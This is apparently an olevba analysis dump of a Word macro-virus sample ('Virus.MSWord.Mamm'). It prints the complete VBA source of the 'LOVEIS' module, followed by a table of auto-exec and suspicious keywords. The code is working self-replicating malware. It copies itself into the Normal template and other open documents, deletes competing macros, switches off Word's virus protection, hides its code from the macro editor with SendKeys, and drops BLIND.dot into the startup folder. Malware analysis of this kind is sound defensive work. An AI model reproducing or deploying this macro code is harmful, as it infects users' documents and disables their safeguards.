olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mamm-9cd2a320f1b472a30694017e15db9c8e30904218
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mamm-9cd2a320f1b472a30694017e15db9c8e30904218 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO LOVEIS.bas 
in file: Virus.MSWord.Mamm-9cd2a320f1b472a30694017e15db9c8e30904218 - OLE stream: 'Macros/VBA/LOVEIS'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 




































Public AD As Object, aDes As Variant
Public NonBLIND As Boolean, afound As Boolean, hapus As Boolean, reset As Boolean, aExc As Boolean, DocCount As Boolean

Function AstMaster()
    Dim nmak(1) As String
    Dim NT As Object
    Dim aSrc$
    On Error GoTo selesai
        nmak(0) = "LOVEIS"
        nmak(1) = "BLIND"
    aSrc = MacroContainer
    Set NT = NormalTemplate
    If Not DocCount Then
        Set AD = ActiveDocument
    ElseIf aSrc <> "BLIND.dot" Then
        aSrc = NT
    End If
    If aSrc = NT Then
        aSrc = NT.FullName: Set aDes = AD
    ElseIf aSrc = AD Then
        aSrc = AD.FullName: Set aDes = NT
        ElseIf aSrc = "BLIND.dot" Then
            Set aDes = NT
            aSrc = Options.DefaultFilePath(8) & "\BLIND.src"
    End If
    Mhapus aDes
    With aDes.VBProject
        If Not (Not hapus And .Description = "LOVEIS" And .VBComponents.Count > 2) Then
            Mcopy aSrc, aDes, nmak
            hapus = False
            .Description = "LOVEIS"
        If aDes = NT Then
            Options.SaveInterval = 1
            CustomizationContext = NT
        CommandBars("Tools").reset
        KeyBindings.Add KeyCode:=BuildKeyCode(77, 1024), KeyCategory:=1, _
        Command:="ToolsRecordMacroStart"
        aDes.Save
    End If
    CommandBars("Macro").Controls(2).OnAction = "ViewVbCode"
Else
    GoTo Aksi
End If
End With
    If afound = True Then Exit Function
Refresh
On Error Resume Next
Aksi:
If aExc = True Then Exit Function
Exit Function
selesai:
If Err.Number = 50289 Then
MsgBox "LOVE IS BLIND HONEY ", vbInformation, "To: My Love EVI"
End If
End Function

Sub Mhapus(Sfile)
Dim nmak As Object
For Each nmak In Sfile.VBProject.VBComponents
    If nmak.Name = "NewMacros" Then NonBLIND = True
    If nmak.Name <> "ThisDocument" And nmak.Name <> "NewMacros" _
    And nmak.Name <> "LOVEIS" And nmak.Name <> "BLIND" Then
        hapus = True
        If reset Then
        Application.OrganizerDelete Sfile.FullName, nmak.Name, 3
        Else
        nmak.CodeModule.DeleteLines 1, nmak.CodeModule.CountOfLines
        End If
    End If
Next nmak
End Sub

Sub Mcopy(Sfile, Dfile, nmak)
Dim aNmak
For Each aNmak In nmak
Application.OrganizerCopy Sfile, Dfile.FullName, aNmak, 3
Next
End Sub

Sub Action()
Attribute Action.VB_ProcData.VB_Invoke_Func = "Normal.aviro.Action"
On Error Resume Next
WBT
MsgBox "LOVE IS BLIND HONEY", vbInformation, "To: My Love Evi"
WBF
End Sub

Sub FileOpen()
WBT
If Dialogs(80).Show <> 0 Then
WBF
AutoOpen
Else
WBF
End If
End Sub

Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
AstMaster
If Documents.Count > 1 Then
    For i = 1 To Documents.Count
    If Documents(i).Name <> ActiveDocument.Name Then
    Set AD = Documents(i)
    DocCount = True
    hapus = False
    AstMaster
    End If
    Next
End If
    If Now > DateSerial(1991, 9, 15) Then Application.OnTime When:=Now + TimeValue("00:05:00"), Name:="LOVEIS.Action"
End
End Sub

Sub ViewVbCode()
On Error Resume Next
SendKeys "%m%s{down}~%d'LOVEIS BLIND HONEY'%m"
End Sub

Sub AutoExec()
On Error Resume Next
If MacroContainer <> NormalTemplate Then
aExc = True
AstMaster
WBT
AddIns.Unload False
WBF
End If
Application.EnableCancelKey = wdCancelDisabled
End Sub

Sub AutoExit()
Dim aAddin As Object
On Error GoTo batal
WBT
If Documents.Count <> 0 Then Documents.Close
Options.DefaultFilePath(2) = Options.DefaultFilePath(6)
afound = True
For Each aAddin In AddIns
    If aAddin.Name = "BLIND.dot" Then afound = False
Next aAddin
        
If afound = True Then
Application.Visible = False
Documents.Add
AstMaster
    With ActiveDocument
        .SaveAs FileName:=Options.DefaultFilePath(8) & "\BLIND.src", FileFormat:=wdFormatDocument, AddToRecentFiles:=False
        .SaveAs FileName:=Options.DefaultFilePath(8) & "\BLIND.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False
    End With
End If
Application.Quit
batal:
WBF
End Sub

Sub ToolsMacro()
WBF
On Error GoTo batal
Mhapus ActiveDocument
If NonBLIND Then
    If MacroContainer = ActiveDocument Then Application.Run NormalTemplate.VBProject.Name & ".LOVEIS.ToolsMacro": Exit Sub
    Application.DisplayAlerts = 0
        With Dialogs(215)
        .Description = "LOVE IS BLIND HONEY"
        If .Display = 1 Then .Execute
        End With
    Application.DisplayAlerts = -1
Else
ViewVbCode
End If
batal:
End Sub

Sub FileTemplates()
    WBF
If Not reset Then Dialogs(87).Display
End Sub

Sub FormatStyle()
    WBF
    Dialogs(180).Show
End Sub
Function Refresh()
reset = True
FileTemplates
Mhapus aDes
End Function

Sub AutoClose()
Application.DisplayAlerts = -1
With Options
.SaveNormalPrompt = False
.SaveInterval = 10
.VirusProtection = False
End With
If ActiveWindow.Caption <> "BLIND" And InStr(1, ActiveDocument.Name, "Docume", 1) = 0 _
And ActiveDocument.Name <> "BLIND.dot" Then AstMaster
End Sub

Sub FileExit()
AutoExit
End Sub

Sub ToolsOptions()
Options.DefaultFilePath(wdUserTemplatesPath) = "C:\Program Files\Microsoft Office\Templates"
Dialogs(wdDialogToolsOptions).Show
Options.DefaultFilePath(wdUserTemplatesPath) = Application.Path
End Sub

Function WBT()
WordBasic.disableautomacros True
End Function

Function WBF()
WordBasic.disableautomacros False
End Function



-------------------------------------------------------------------------------
VBA MACRO BLIND.bas 
in file: Virus.MSWord.Mamm-9cd2a320f1b472a30694017e15db9c8e30904218 - OLE stream: 'Macros/VBA/BLIND'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' This is just template
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Application.Visible |May hide the application                     |
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

